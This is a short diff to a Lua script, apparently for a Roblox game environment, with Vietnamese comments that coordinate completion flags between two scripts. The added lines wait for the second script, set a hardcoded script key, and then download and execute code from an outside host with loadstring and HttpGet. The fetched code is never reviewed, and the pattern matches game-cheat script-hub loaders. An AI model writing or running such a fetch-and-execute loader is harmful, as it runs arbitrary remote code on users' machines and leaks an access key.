@@ -9,3 +9,14 @@ _G.script1Done = false -- Đặt trạng thái ban đầu là chưa hoàn thành
 
 -- Đánh dấu trạng thái hoàn thành
 _G.script1Done = true
+
+
+-- Chờ đến khi trạng thái shared.script2Done là true
+while not _G.script2Done do
+    print("Script 2 chưa hoàn thành, đang chờ...")
+    task.wait(1) -- Chờ 1 giây trước khi kiểm tra lại
+end
+
+task.wait(15)
+script_key = "KdqcejlWQednKCTBnWSxwDOBFXyavkaN"
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
